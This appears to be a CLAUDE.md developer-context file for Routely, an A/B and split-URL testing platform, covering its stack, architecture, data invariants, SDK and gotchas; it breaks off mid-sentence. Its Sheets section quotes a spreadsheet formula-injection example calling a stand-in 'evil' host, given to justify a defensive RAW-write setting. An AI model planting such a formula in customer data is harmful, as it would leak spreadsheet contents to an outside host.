# Routely — context for Claude

Read this before changing anything. It covers what the project is, the decisions that are
already settled, the invariants that must not be broken, and the things that will otherwise
cost you an hour to rediscover.

Claude Code loads this file automatically. It is also readable on its own if you are pasting
context into a fresh session.

---

## 1. What this is

An **experimentation platform** with two kinds of test:

- **Split URL tests** (`type: SPLIT_URL`) — the arms are different URLs. Visitors to the control
  URL are redirected to one of up to four variant URLs.
- **A/B tests** (`type: AB`) — one page; each variant is a list of element changes (text, colour,
  image) on CSS selectors, made in a visual editor and applied by the SDK without a redirect.

```
                    ┌─ 50% ─► /pricing      (control — visitor stays)
visitor ─► /pricing ┤                                                  ─► /thank-you = conversion
                    └─ 50% ─► /pricing-v2   (variant — redirected)
```

A customer creates a **project** (the database calls it a `Website`), installs one tracking
snippet on it, then creates **experiments** through a 6-step wizard (Type → Setup → Traffic →
Targeting → Goals → Review & launch; Setup holds the variants). The SDK decides each visitor's arm, redirects or
applies changes, and reports page views, visible time and goal events back; conversions are
decided server-side.

The UI is a faithful implementation of the HTML design prototype
(`github.com/RaihanSoft/routely-design`, `index.html`), currently its **v2** (commit `ecc3144`). The
prototype is the source of truth for layout, copy and interactions; see §5 "The UI follows the
design prototype" — including how to read the bundled file.

Modelled on [Mida](https://mida.so). The user (`rakibul@blinto.co`) built this over a series
of numbered "Parts", each with its own spec.

---

## 2. Locked stack — do not substitute

The user declared this stack locked in the very first message. **Do not swap any of it** for a
different framework, ORM, database, auth provider or deployment approach without being asked.

| Concern | Choice | Version |
| --- | --- | --- |
| App | Next.js App Router + TypeScript, **one** full-stack project | `next@16.3.3`, `react@19.2.8` |
| UI | Tailwind CSS + shadcn/ui | `tailwindcss@4.3.3` |
| Auth | Auth.js + Google OAuth | `next-auth@5.0.0-beta.32` |
| Database | PostgreSQL | `postgres:17-alpine` |
| ORM | Prisma | `prisma@7.10.0` + `@prisma/adapter-pg` |
| SDK | Standalone vanilla TypeScript → one browser bundle | esbuild `0.28.2` |
| Deploy | Contabo VPS, Ubuntu, Docker, Compose, Nginx, Let's Encrypt | not built yet |

Additions made for tooling (not substitutions): **npm workspaces** (pnpm is not installed on
this machine), **Zod** for validation, **Vitest** for tests, **tsx** for CLI scripts.

### Two pins that look wrong but are deliberate

- **`prisma@7.10.0`, not `latest`.** `latest` resolves to `8.0.0-rc.x` — a release candidate —
  while `@prisma/client` has no matching 8 release. 7.10.0 is the stable pair.
- **`next-auth@5.0.0-beta.32`, pinned exactly.** The `latest` tag is v4, which cannot call
  `auth()` in Server Components and therefore cannot protect App Router routes the way this app
  is structured. v5 is beta by version number but is what the App Router ecosystem runs on.
  Beta releases have shipped breaking changes, hence the exact pin.

---

## 3. Repository map

```
routely/
├── apps/web/                 Next.js dashboard + public API — the only deployable
│   ├── prisma/               schema.prisma, migrations/, seed.ts (3 rich projects), verify.ts
│   ├── prisma7.config.ts     Prisma 7 CLI config (loads apps/web/.env via dotenv)
│   └── src/
│       ├── app/              routes (see §4)
│       ├── components/
│       │   ├── ui/           shadcn button + sonner toaster, rethemed to the design's exact values
│       │   ├── rl/           design primitives (status pill, traffic bar, modal, tabs, …)
│       │   ├── layout/       shell: sidebar, project switcher, nav, profile menu, drawer, leave guard
│       │   ├── projects/     project modal (favicon probe), manage-projects rows/dialogs
│       │   ├── dashboard/    Overview: experiments table, conversions + visitors cards, activity +
│       │   │                 integrations rail, CSV export, empty state
│       │   ├── experiments/  list/ and detail/ (header, setup, activity, share), end/delete modals
│       │   ├── results/      verdict hero, scorecards, chart, comparison + CI, goals, traffic, h2h
│       │   ├── wizard/       the 6-step create/edit wizard, launch + leave modals
│       │   ├── editor/       visual editor, mock page, preview modal, preview links
│       │   ├── tracking/     install panel + modal, getInstallInfo
│       │   ├── metrics/      metrics & events table, new-metric modal, GTM panel
│       │   ├── integrations/ Google Sheets card (+ Picker), CDN panel
│       │   ├── settings/     settings shell (7 side tabs), project settings, domains, team (seam)
│       │   └── login/        Google button, login showcase
│       ├── server/           server-only; never imported by a client component
│       │   ├── db.ts         the single PrismaClient (+ PrismaPg adapter)
│       │   ├── errors.ts     AppError taxonomy → HTTP status mapping
│       │   ├── validate.ts   parseOrThrow — the only Zod → AppError bridge
│       │   ├── auth/         config.ts, index.ts, session.ts (the seam), actions.ts
│       │   ├── repositories/ website, experiment, visitor, assignment, event, conversion, config, …
│       │   ├── services/     website (projects), experiment, metric, member, analytics, dashboard,
│       │   │                 ingest, url-check, cdn, pixel, sheets …
│       │   ├── actions/      Server Actions: project, experiment, metric, url-check, pixel, share, …
│       │   └── http/         rate-limit.ts, bot-filter.ts
│       ├── validation/       Zod schemas
│       ├── lib/              pure, client-safe logic + tests: domain (shared vocabulary), stats,
│       │                     verdict, validate-draft, qa, targeting, traffic, editor, format,
│       │                     view-models (types), sdk-config, goal-match, url, snippet, routes …
│       ├── generated/prisma/ Prisma client output — GITIGNORED, regenerated on build
│       └── proxy.ts          Next 16's renamed middleware (optimistic auth check only)
├── packages/sdk/             the tracking SDK — vanilla TS, zero dependencies
│   ├── build.mjs             esbuild → dist/sdk.js, size-budgeted, publishes to apps/web/public/sdk/v2
│   ├── src/                  see §7
│   └── test/                 no DOM required (changes are tested against a fake DOM)
├── infra/
│   ├── docker-compose.dev.yml    Postgres only (the app runs on the host)
│   └── nginx/conf.d/             app.conf, cdn.conf — production reference configs
└── docs/                     ARCHITECTURE, DATABASE, AUTH, SDK-DEPLOYMENT, INTEGRATIONS
```

**Read the docs in `docs/` before large changes.** They carry the reasoning, not just the
shape — particularly `SDK-DEPLOYMENT.md`, which explains the v4 protocol and why time-on-page is
approximate and must be labelled as such wherever it appears.

---

## 4. Routes

Everything a customer works on is scoped to a project: `/p/[projectId]/…`, where `projectId` is
`Website.id`. `(app)/p/[projectId]/layout.tsx` loads the project through `requireProject` (not
owned → not found). The last project visited is remembered in the `rl_project` cookie.

| Route | Notes |
| --- | --- |
| `/` | → remembered project's dashboard, else the first active project, else `/projects` |
| `/login` | Google sign-in in the design's two-column layout (`?signedOut=1` shows the notice) |
| `/projects` | Manage projects: search, switch, edit, archive/restore, delete, create |
| `/p/[projectId]` | Dashboard ("Overview"): tracking pill (opens the install modal), Experiments table (All · Running · Needs action), conversions by running experiment, unique visitors over the last 14 project-local days, Team activity + Recommended integrations (a right rail at ≥1360px), client-side CSV export, empty state |
| `/p/[projectId]/experiments` | List: status tabs, search, type filter, sort (all in the URL) |
| `/p/[projectId]/experiments/new` | Wizard (`?type=ab\|redirect`, `?step=type\|basics\|traffic\|targeting\|goal\|review`; the old `variants` opens Setup) |
| `/p/[projectId]/experiments/[id]` | Detail: `?tab=results\|setup\|activity`, `?range=`, `?goal=` |
| `/p/[projectId]/experiments/[id]/edit` | Wizard on a draft (non-drafts redirect to detail) |
| `/p/[projectId]/metrics` | Metrics & goals: `?tab=metrics\|gtm` |
| `/p/[projectId]/integrations` | `?tab=sheets\|cdn`; renders the Google OAuth flash |
| `/p/[projectId]/settings/[tab]` | `project` · `install` · `team` |

The last three render as **one** design "Settings" page with seven side tabs (Project, Installation
& tracking, Metrics & events, Google Tag Manager, Google Sheets, CDN delivery, Team) through
`components/settings/settings-shell.tsx`; each tab links to its own route above, so the sidebar's
"Metrics & goals" / "Integrations" / "Settings" entries stay highlighted correctly.
| `/share/[token]` | **Public**, read-only results. No session. `noindex` |
| `/get-started`, `/experiments…`, `/websites/[id]`, `/metrics…`, `/integrations` | Legacy — redirect into the current project |
| `/api/auth/[...nextauth]` | Auth.js handlers, Node runtime |
| `/api/integrations/google/start` | **POST only.** Mints signed state, redirects to Google |
| `/api/integrations/google/callback` | Verifies state, stores the connection, returns to `/p/<rl_project>/integrations` |
| `/api/cron/sheets-sync` | Scheduled daily sync. Requires `Authorization: Bearer $CRON_SECRET` |
| `/api/v1/config` | **Public.** Experiments for a site id (protocol v4; v3 shape for old bundles) |
| `/api/v1/events` | **Public.** Event ingestion |

Route groups carry no URL segment. `(app)` owns the authorization boundary and the dashboard
chrome; `(auth)` is chrome-free.

---

## 5. Architecture decisions already settled

Do not undo these without a reason. Each was chosen against a specific alternative.

### The UI follows the design prototype

The whole UI was replaced with the HTML prototype's structure (`RaihanSoft/routely-design`).
Inline styles in that prototype are the spec: tokens live in `globals.css` (`navy`, `ink-2/3`,
`brand`, `coral`, `success*`/`warning*`/`danger*`, `arm-*`, the `nav:` 900px breakpoint) and the
exact control values are baked into `components/ui` and `components/rl`. Reuse those — don't
introduce shadcn defaults or new one-off styles. Where the prototype is a mock, the app either
does the real thing (URL checks, install verification, GTM test event, launch) or shows a
clearly labelled **service seam**; it never shows invented numbers (fake latencies, fake
traffic estimates). Deliberate departures: Google-only sign-in (locked stack), image changes take
a real image URL, A/B changes carry an editable CSS selector, GTM code uses
`routely.push(['track', key])` so it works before the SDK loads, the dashboard's CDN row shows no
"Healthy" status (the CDN is a seam), the dashboard's amber row edge marks only rows that need
action (the prototype's markup hard-codes it on every row; its script computes it per row), and
prototype rendering bugs (text spilling into the next grid column, a dead 7th stepper column)
are not copied.

**Reading the prototype.** `index.html` is a bundler export: the readable source is inside it.
`<script type="__bundler/manifest">` holds base64 (gzip when `compressed`) assets and
`<script type="__bundler/template">` a JSON string with the markup (`{{ }}` holes, `<sc-if>`,
`<sc-for>`, `style-hover=`) followed by one `text/x-dc` logic class whose `V`/`W`/`D`/`E` values
feed it. Decode both with a few lines of Python. To screenshot a prototype state, load the file
in headless Chrome, walk a DOM node's React fiber up to the component whose `stateNode.logic` is
set, and call `logic.setState({authed: true, ...})` / `logic.go(...)` / `logic.startCreate(...)`.

**Line height.** The prototype's body sets none, so text inherits the browser's `normal`;
`globals.css` matches that (`body { line-height: normal }`), and components that the design
gives a looser line height say so explicitly (`leading-[1.5]`). Prefer arbitrary font sizes
(`text-[13.5px]`) over Tailwind's named ones (`text-sm`), which carry their own line height.

### Project = Website

The design's "project" is the `Website` model; the name stays in the database and in services
(`website.service` owns project logic). A project has a primary `domain` plus `WebsiteDomain`
rows; the same-site rule accepts any of them and their subdomains. Archiving pauses running
experiments and hides the project from the switcher.

### Service seams: team, CDN

`ProjectMember` rows are stored and shown, but **grant no access** — authorization is still
owner-only (`Website.userId`). The CDN panel's figures are placeholders (`placeholder: true`)
and purge only records a time. Both are labelled in the UI. Extending either for real is a
backend task, not a UI one.

### Layers

`lib/` is pure and client-safe (statistics, verdicts, wizard validation, QA/readiness, targeting,
traffic rules — ported from the prototype and parity-fuzzed against it). `lib/domain.ts` is the
shared vocabulary; `lib/view-models.ts` the types services return. Pages load via services and
pass plain props; mutations are Server Actions that take one object and return
`ActionResult<T>` (wizard field errors are keyed `step.field`).

### Authorization is structural, not remembered

Every ownership-sensitive repository function takes `userId` and folds it into the `where`
clause. Writes use `updateMany`/`deleteMany` so the tenant filter participates in the write
itself rather than relying on a prior read. **Anything the actor does not own reports
"not found", never "forbidden"** — so an id cannot be probed for existence.

Server Actions re-establish the actor from the session and never trust an id in the form body.
A Server Action is a public HTTP endpoint.

### The session seam

`src/server/auth/session.ts` is the **only** module that knows how a session is obtained.
Nothing else imports `next-auth`. It exposes:

- `getSession()` — nullable
- `requireSession()` — redirects to `/login` (pages and layouts)
- `requireUser()` — throws `AppError("UNAUTHENTICATED")` (actions and route handlers)

### Two layers of route protection, one boundary

| Layer | Checks | Security boundary? |
| --- | --- | --- |
| `src/proxy.ts` | Session cookie **presence** | **No** — no database in that runtime |
| `(app)/layout.tsx` | Session **validity**, against the database | **Yes** |

Proxy exists only to preserve the destination in `?callbackUrl=` (a layout is never told the
request path) and to reject obviously-anonymous requests before rendering. The Next.js docs
warn against treating proxy as session management.

### Database sessions, not JWT

Costs one DB read per request; buys **revocation** — signing out deletes the row and the
session is dead immediately, which no signed token can offer.

### `trustHost: true` **and** a required `AUTH_URL`

Only safe as a pair. Nginx delivers the Host via `X-Forwarded-Host` and Auth.js will not trust
it without `trustHost` — but `trustHost` alone permits host-header injection into callback
URLs. `env.ts` therefore requires `AUTH_URL` in production so callbacks are built from a
canonical origin.

### Service ↔ repository split

```
Route Handler / Server Action   HTTP + session only
        ↓
services/*.ts                   business rules; first argument is always actorUserId
        ↓
repositories/*.ts               queries only; ownership-sensitive fns take userId
        ↓
server/db.ts                    the only PrismaClient in the process
```

Rules that need data a Zod schema cannot see live in the **service**, not the schema — the
same-site rule needs the website's domain; the conflict rule needs the website's other
experiments.

### Metrics have one source of truth each

Nothing is denormalised into a counter column that could drift:

| Metric | Derived from |
| --- | --- |
| Visitors per arm | `count(assignments)` grouped by variant |
| Page views | `count(events)` where `type = 'page_view'` |
| Visible time | `sum(events.durationMs)` where `type = 'time_on_page'` |
| Conversions (counting *unique*) | `count(conversions)` for the goal's `goalKey`, grouped by variant |
| Conversions (counting *all*) | `count(events)` where `type = 'conversion'` and `goalKey` matches |
| Metric "last received" / 24h | `metric_hits` (every custom event and matching page visit) |
| Conversion rate | conversions ÷ **assigned** visitors |

`events` and `conversions` both carry `variant`, so **aggregation never needs a join**.

Conversion rate uses assigned visitors as the denominator, not visitors who loaded a page:
everyone bucketed had the opportunity to convert, and the smaller denominator would inflate the
rate for whichever arm loses more visitors before rendering — exactly what a redirect test
measures.

### The Sheets integration: one grant, one spreadsheet per website

The customer authorises Google **once per account** (`SheetsConnection` — the grant, nothing else).
Each **website** then points at its own spreadsheet (`WebsiteSheetTarget`). Attaching one needs no
consent screen because the grant already exists, and a grant per website would hit Google's ~100
refresh-tokens-per-client cap. Attaching is **optional**; a website with no target is not synced.

**Scopes are all non-sensitive — `openid`, `userinfo.email`, `drive.file` — so Google requires no
verification review.** `drive.file` covers `spreadsheets.create` and `values.append` on files the app
created or the customer picked, because the Sheets API accepts Drive scopes. Do **not** re-add
`spreadsheets` (sensitive) or `drive.metadata.readonly` (restricted, plus a paid annual security
assessment); the first was replaced by `drive.file`, the second by the Google Picker. Consequence:
**Routely cannot list a customer's spreadsheets** — browsing is the Picker's job, and a
`files.list` under `drive.file` would return only files this app made. `include_granted_scopes` is
deliberately absent from the authorize URL, or the narrowing would never take effect for anyone who
granted the old scopes.

### The Sheets integration is a second OAuth flow, not the sign-in provider

Adding `spreadsheets` and `drive.metadata.readonly` to the Auth.js Google provider would force
every customer to grant Drive access **merely to sign in**, and `Account`'s
`@@unique([provider, providerAccountId])` means a second consent for the same Google account would
write over the sign-in row the adapter owns. So `/api/integrations/google/{start,callback}` is a
hand-rolled authorization-code flow writing to `sheets_connections`. No `googleapis` dependency —
four documented REST endpoints do not justify megabytes of transitive dependency, and the app's
only other outbound call is a hand-written `fetch` too.

The refresh token is the only value in this database that grants ongoing access to something
*outside* Routely, so it is the only value encrypted at rest (AES-256-GCM, `lib/secret-box.ts`).
`TOKEN_ENCRYPTION_KEY` is deliberately separate from `AUTH_SECRET`: rotating `AUTH_SECRET` signs
everyone out, whereas rotating this forces every customer to reconnect. With no key the integration
reports itself unavailable — it never stores a token in the clear.

`docs/INTEGRATIONS.md` carries the rest, including why the feature is **not exactly-once** and must
not be described as such.

---

## 6. Data model invariants

These constraints carry the product's guarantees. **Do not weaken them.**

| Constraint | Guarantees |
| --- | --- |
| `websites.publicSiteId` unique | The public identifier in the snippet is globally unique |
| `visitors (websiteId, anonymousId)` unique | One row per browser per website; concurrent requests converge |
| `assignments (experimentId, visitorId)` unique | **A visitor can never hold both arms** |
| `conversions (assignmentId, goalKey)` unique | **A refresh cannot inflate any goal's count** — one conversion per visitor per goal (`goalKey` is `"url"` or a metric id) |
| `metrics (websiteId, key)` unique | An event key means one metric per project |
| `experiments.shareToken` unique | Safe to look up a public results page by token alone |
| `sheets_connections.userId` unique | One Google *authorisation* per account (not a destination) |
| `website_sheet_targets.websiteId` unique | One spreadsheet per website |

Enum values: `ExperimentStatus` (DRAFT/ACTIVE/PAUSED/ARCHIVED — the UI shows ARCHIVED as
"Completed", and as "Winner" when `winnerPosition > 0`), `ExperimentType` (SPLIT_URL/AB),
`CountingMode` (UNIQUE/ALL), `MetricKind` (CUSTOM_EVENT/PAGE_VISIT), `UrlMatchType`
(EXACT/PREFIX), `EventType` (`page_view`, `assignment`, `time_on_page`,
`conversion` — lowercase, because the user specified those names and they are the literal wire
strings the SDK sends, so no translation layer exists).

Application-level rules enforced in `experiment.service.ts`:

- **Same-site rule.** Control, variant *and* conversion URLs must be on one of the project's
  domains (primary or extra) or a subdomain. `isSameSite` is dot-anchored so `evil-acme.com` and `acme.com.evil.test` are both
  rejected. (The conversion URL was included beyond the original spec: a goal on another domain
  could never record anything, so allowing it would only create silent duds.)
- **One active experiment per control URL.** Checked at create, at edit, and **again on
  publish** — another experiment may have been activated in between. Comparison uses normalised
  URLs and accounts for PREFIX overlap.
- **URLs are fixed once an experiment has started.** Visitors are already bucketed against the
  old configuration.
- **Traffic is split by weight, across up to five arms.** `Experiment.controlWeight` and each
  `ExperimentVariant.weight` are the arms' shares of *included* traffic (the wizard keeps them
  summing to 100 with `setWeight`/`evenSplit`; the SDK still normalises at draw time), kept
  separate from `trafficAllocation` (the design's "coverage") so neither can drift.
- **Ending records an outcome.** `winnerPosition` 0 = control won, n = variant n, null = no
  clear winner; `keepWinner` (Split URL only) keeps redirecting everyone to the winning URL.
- **A/B variants have `url = ""` and `changes`** `[{selector, prop: text|bg|image, value, el?}]`;
  image values must be an https URL or a path.
- **Every new experiment is judged on a conversion URL** (design v2), for both types: the wizard
  offers no goal-type choice, no match type (exact) and no secondary goals, and launch requires a
  same-site conversion URL. Metric (custom-event / page-visit) goals and secondary goals are
  **legacy**: rows that have them keep them, the server still matches them and results show them
  in the Goal performance table, but no UI creates them any more. Live edit never sends
  `secondary`; an omitted `secondary` means "unchanged" in `experiment.service`.
- **The wizard's targeting step offers only Device rules** (v2 hides the page rule and the other
  "Narrow by" conditions). The page rule follows the control URL on every exit from Setup; a
  legacy draft whose rule was customised still shows it so it can be fixed. The SDK and
  `lib/targeting` still support every rule type.

### Ingestion never trusts client-supplied ownership

`ingest.service.ts` — the only write path reachable without a session:

- The **website** comes from the public site id, never from a payload field
- Every **experiment** is re-checked against that website; only `ACTIVE` accepts events
- The **stored arm wins** over whatever the client claims
- **URLs are normalised server-side** — a URL over the network is an assertion, not a fact
- **Timestamps are clamped** (browser clocks are routinely hours off)
- **A conversion requires a pre-existing assignment.** Conversions are decided server-side from
  `page` and `track` events against the visitor's existing assignments in running experiments
  (URL goals, plus legacy custom-event / page-visit and secondary goals). Those events never
  create a visitor or an assignment — otherwise a forged request could invent a visitor, choose
  their arm, and convert them.

---

## 7. The SDK

`packages/sdk` — vanilla TypeScript, **zero runtime dependencies**, one IIFE bundle served at
`/sdk/v2/sdk.js` (and `/sdk.js`). About **7.3 kB gzipped against a 7.5 kB budget the build
enforces** (raised from 6 kB for A/B changes, targeting, `track()` and preview; see `build.mjs`).
Installation is two script tags — an inline anti-flickering block and the tracking tag — pasted
into `<head>`:

```html
<script src="https://cdn.example.com/sdk.js" data-site-id="rt_abc123"></script>
```

In `<head>`, no `async`/`defer`, so the redirect decision precedes first paint. Protocol **v4**
(`docs/SDK-DEPLOYMENT.md`); `/sdk/v1/` bundles are still answered in the v3 shape.

What it does on each page: evaluate each experiment's page rule and audience (match type, device,
new/returning, query/UTM/referrer conditions; countries are filtered server-side), draw coverage
and an arm (both persisted), then redirect (Split URL) or apply element changes and reveal
(A/B). Targeting decides *entry* only — an assigned visitor keeps their arm. A Split URL
variant's own page records that arm's page view and visible time; the control page records only
the assignment for visitors it redirects. Crawlers get nothing (no redirect, changes, assignment
or events). `?routely_preview=<experimentId>:<position>` shows an arm and records nothing.
`window.routely.track(key)` / `(window.routely = window.routely || []).push(['track', key])` send
custom events.

| Module | Responsibility |
| --- | --- |
| `contract.ts` | Wire types shared with the API. Type-only, no runtime |
| `env.ts` | Guarded storage/cookie/crypto access. **Never throws** |
| `identity.ts` | Anonymous visitor id; layered persistence; cross-origin handoff |
| `url.ts` | Normalisation, EXACT/PREFIX matching, handoff params |
| `targeting.ts` | Page rules (exact/contains/starts/wildcard/regex), audience, devices, bot check |
| `inclusion.ts` | Coverage draw, persisted |
| `assignment.ts` | Weighted arm draw, persisted so it never repeats |
| `redirect.ts` | The decision, and four independent loop guards |
| `changes.ts` | Applies A/B changes to selector lists, waiting briefly for elements |
| `preview.ts` / `api.ts` | Preview parsing; the public `track`/`push` API and pre-load queue |
| `engagement.ts` | Visible-time accumulator (`performance.now()`, delta reporting) |
| `dedupe.ts` | Page-view guard against repeated SDK initialisation |
| `cloak.ts` | Calls `window.__routelyReveal` — the overlay itself lives in the install snippet |
| `config.ts` / `transport.ts` / `track.ts` | Fetch + cache config; timeouts; `sendBeacon` |
| `index.ts` | Options, boot sequence, orchestration |

### Three properties that govern every change here

1. **It never breaks the page.** Every failure path — no storage, no network, malformed
   response, blocked request — ends with the SDK doing nothing. Nothing throws into the host
   page; no promise is left to reject unhandled.
2. **It never blocks the page.** Loaded synchronously so a redirect can precede paint, but the
   work is async and never gates rendering.
3. **It carries no secret.** The only credential-shaped value is the public site id, visible in
   page source by design.

### Four redirect loop guards

Each sufficient on its own for the case it covers:

1. Only the **control** URL is a trigger; the variant is never matched
2. Already on the variant — catches a variant nested under a `PREFIX` control
3. Arrived by this experiment's own redirect (handoff params) — works across origins
4. A session counter incremented **before** navigating, capped at one redirect

Plus a final check that the target is not the page already displayed. `location.replace()`, not
`assign`, so Back does not bounce.

### Matching logic is duplicated on purpose

`apps/web/src/lib/url.ts` and `packages/sdk/src/url.ts` implement the same normalisation. The
SDK cannot import from the app, and a shared package would add a module graph to a bundle whose
whole point is being one small file. **Both have mirrored test suites — change both together.**
The same applies to page-rule matching: `lib/targeting.ts` `matches()` and
`packages/sdk/src/targeting.ts`, pinned together by `lib/targeting-mirror.test.ts`.

### Time on page is approximate, and must be labelled so

The browser reports *document visibility*, not attention. A tab open on a monitor nobody is
watching counts; time after the last beacon is lost. It is meaningful **as a comparison between
two arms** (shared bias cancels), never as a session-duration figure. See
`docs/SDK-DEPLOYMENT.md`.

### Statistics follow the design (decided by the user)

Results show the design's statistics, computed on real data in `lib/stats.ts` and
`lib/verdict.ts` (ported from the prototype and parity-fuzzed against it): a two-proportion
z-test per variant against control giving **chance to beat control**, a 95% interval on the
lift and a p-value, judged against the project's **significance threshold** (90/95/99%, set in
Settings → Project). The verdict ("Variant A is winning", "Too early to call" with an estimate of
visitors and days still needed, "Control is winning", …) and the dashboard's confidence bars use
the same functions (the dashboard table's "Ready to call" and result labels too). This replaced the earlier "currently ahead · not proof" rule at the user's
explicit request. Keep the methodology note visible wherever intervals and p-values appear.

---

## 8. Commands

```bash
npm install
cp .env.example apps/web/.env      # BOTH Next.js and the Prisma CLI read apps/web/.env
npm run db:up                      # Postgres in Docker
npm run db:migrate
npm run db:seed                    # optional; idempotent
npm run dev                        # http://localhost:3000

npm run check                      # typecheck + lint + format:check + tests — run before finishing
npm run build                      # builds the SDK first, then the app
npm run db:verify                  # 16-check data-model smoke test against live Postgres
npm run sdk:build                  # size-budgeted SDK build
npm run sheets:sync -- --dry-run --day 2026-09-28 --user <id>   # print rows, write nothing
npm run sheets:sync                # the real daily sweep (needs TOKEN_ENCRYPTION_KEY)
```

**Local and production are configured independently and need no switching.** `apps/web/.env`
holds local values only; production values live in the Vercel project's environment variables,
and `.vercelignore` keeps every `.env` off the build machine. `env.ts` derives `AUTH_URL` and
`NEXT_PUBLIC_APP_URL` from `VERCEL_PROJECT_PRODUCTION_URL` when they are unset, so a deployment
cannot inherit a localhost value.

`db:reset` and `db:seed` run `scripts/assert-local-db.mjs` first, which aborts unless
`DATABASE_URL` resolves to a local host. `.env` did once point at production Neon — with a
duplicate `DATABASE_URL` line, so the local one *looked* right while the second silently won —
which aimed a command that drops every table at production data. `db:deploy` is deliberately
**not** guarded: that is how Vercel applies migrations during `vercel-build`.

Tests: **463** — 155 in the SDK, 308 in the app. Both run under Vitest in a Node environment.
`npm run db:seed` builds three projects with stable ids (`seed_kestrel` — 9 experiments of both
types and every status, `seed_northwind` — 4, `seed_lumen` — fresh, not installed) owned by
`dev@routely.local`; it takes about a minute.

---

## 9. Gotchas that will cost you time

Every one of these was hit at least once during the build.

**Restart `npm run dev` after any `prisma generate`.** `db.ts` caches the client on
`globalThis` across hot reloads (correct for connection pooling), so a regenerated client is
**not** picked up. Symptom: `The column X does not exist in the current database` or
`PrismaClientValidationError` on a field you just added. This bit the build three separate
times.

**Prisma cannot rename a column.** Its diff sees a drop plus an add and recreates the column
empty. Three migrations here are hand-written `ALTER TABLE ... RENAME COLUMN`. Check
`prisma/migrations/*/migration.sql` before committing any migration — that file is what runs in
production, not the schema.

**`server-only` throws under Vitest.** `apps/web/vitest.config.mts` aliases it to the package's
own `empty.js`. Do not remove that alias, and do not weaken the guard in the app build.

**Next.js 16 renamed things.** Middleware is now `proxy.ts`. `PageProps<'/route'>` and
`LayoutProps<'/route'>` are generated globals — this codebase uses explicit prop types instead,
so `tsc --noEmit` works without a prior build. The `eslint` key in `next.config.ts` no longer
exists. Bundled docs are at `node_modules/next/dist/docs/`.

**`useActionState` uses a different progressive-enhancement encoding** than a bare Server Action
form: `$ACTION_REF_n` / `$ACTION_n:0` / `$ACTION_KEY`, not `$ACTION_ID_<hex>`. Matters if you
write a harness that replays forms.

**Prettier reflows JSX text.** A `python .replace()` against text you wrote earlier will
silently no-op after formatting. **Always `assert old in s` before replacing.** Two edits were
lost this way and only caught by lint reporting unused imports.

**`notFound()` inside `(app)` returns HTTP 200, not 404.** `loading.tsx` creates a Suspense
boundary that flushes the shell and commits the status before `notFound()` runs. The not-found
*page* renders correctly and no data leaks — only the status code is wrong. Verify
authorization by asserting on content, not on `=== 404`.

**React splits `{value} text` into separate text nodes.** `grep "50 / 50"` fails on markup that
renders correctly. Use a tolerant pattern when asserting against HTML.

**`vm` contexts have no `URL`.** It is a Web API, not an ECMAScript built-in. Supply it when
running the SDK bundle in a sandbox.

**A `tsx` script cannot import anything under `src/server` without
`--conditions=react-server`.** Those modules begin `import "server-only"`, whose whole job is to
throw outside an RSC bundler; Node resolves that package's `react-server` export condition to a
no-op. `npm run sheets:sync` does this, and also needs `import "dotenv/config"` *first* so `env.ts`
has a `DATABASE_URL` to validate. `prisma/seed.ts` and `prisma/verify.ts` avoid the problem
entirely by building their own Prisma client and importing nothing from `src/`.

**`server-only` is also why `server/crypto.ts` and `lib/secret-box.ts` are split.** The cipher
takes an explicit key and reads no configuration, so it is unit-testable; anything importing `env`
fails under Vitest on a missing `DATABASE_URL` it never uses. Put pure logic in `lib/`, the
configured wrapper in `server/`.

**The Google Picker is why the scopes can stay non-sensitive.** It needs
`NEXT_PUBLIC_GOOGLE_API_KEY` and `NEXT_PUBLIC_GOOGLE_PROJECT_NUMBER` (the Cloud project *number*,
i.e. the digits before the dash in the client id) — without the latter, a picked file is never
associated with the app and the write that follows 404s. In the Google console, *Authorized redirect
URIs* and *Authorized JavaScript origins* are **different fields** and both are needed.

**The Sheets tab is rewritten from source, not appended to.** Every refresh recomputes the last 30
days and overwrites one tab, which is why there is no claim mechanism: overwriting is idempotent, so
a duplicated run writes the same cells. An earlier design appended completed days to one tab and kept
today in another; it put the same date in two places with different numbers and was replaced. Routely
creates and owns the tab (`Routely`) — the customer picks a *spreadsheet*, because a full overwrite
aimed at a tab holding their own work would destroy it.

**The Sheets refresh is triggered by traffic but throttled, never per-event.** Google allows 60
write requests per minute per user, which a write-per-page-view would exceed at about one visitor a
second. `/api/v1/events` schedules `refreshSheet` with Next's `after()` so it runs *after* the
response — ingestion must stay fast and must never fail because a spreadsheet is unreachable, so
that function swallows every error. The throttle is a compare-and-set on
`WebsiteSheetTarget.refreshedAt`; do not replace it with a read-then-write, or concurrent
beacons will each fire a write. 

**Sheets rows must be written with `valueInputOption=RAW`.** `USER_ENTERED` parses a leading `=`
as a formula, and experiment names are customer-controlled text — so a name like
`=IMPORTXML("http://evil/",…)` would become a live formula in the customer's spreadsheet. There is
a test asserting a formula-shaped name passes through verbatim; if it fails, read the comment
beside it before "fixing" it.

**Prisma logs the sync's expected unique violations at error level.** A second worker losing the
claim race prints `Unique constraint failed on ... sheets_sync_runs_websiteId_day_key`. That is
the idempotency mechanism working, not a bug; it is not suppressed because silencing it would
silence real constraint errors too.

**`npm run build` and `next dev` now use separate output.** Next 16 writes dev output to
`.next/dev`, so a build no longer breaks a running dev server (checked on 16.3.3 — if a dev
server ever misbehaves after a build, restart it anyway). If the dev server starts refreshing
every page about once a second ("Subscription error, resubscribing" in the log), Turbopack's HMR
is wedged — restart it; it is not an app bug.

**`window.history.replaceState` must be passed `null` state.** Next patches it to keep its router
in sync, but skips that for a state object carrying its own `__NA` marker — which is what
`window.history.state` is. Pass the current state and the address bar looks right until the next
Server Action, when the router puts its stale URL back (the wizard's `?step=` did exactly this).

**`cn()` drops a line height that comes before a font size.** tailwind-merge treats a later
`text-[size]` as overriding an earlier `leading-*`. Put `leading-*` after the size class.

**The local database can lag the migrations.** If a page fails with an unknown column or
argument, run `npm run db:status`; apply with `npm run db:migrate` (or `db:deploy`), then
`prisma generate` and restart `next dev`. `npm run db:up` needs Docker running — on this machine
that is Docker Desktop (`systemctl --user start docker-desktop`, context `desktop-linux`).

**Install verification can be tested end to end locally.** In development the pixel check skips
the private-address guard, so a project on `lvh.me` (which resolves to 127.0.0.1) verifies against
anything listening on port 80 that serves the snippet. Docker Desktop cannot mount `/tmp`; copy
files into a container with `docker cp`.

**The editor's live page is view-only, and "loaded" only means the frame's load event fired.**
A page that refuses framing (X-Frame-Options / CSP `frame-ancestors`) still fires it in Chrome,
so it is reported as loaded and shows the browser's blocked page; only a page that never answers
reaches the 9-second error. Nothing is injected into the frame. It is a real page load: with the
snippet installed there, the person editing is counted as a visitor and a running Split URL test
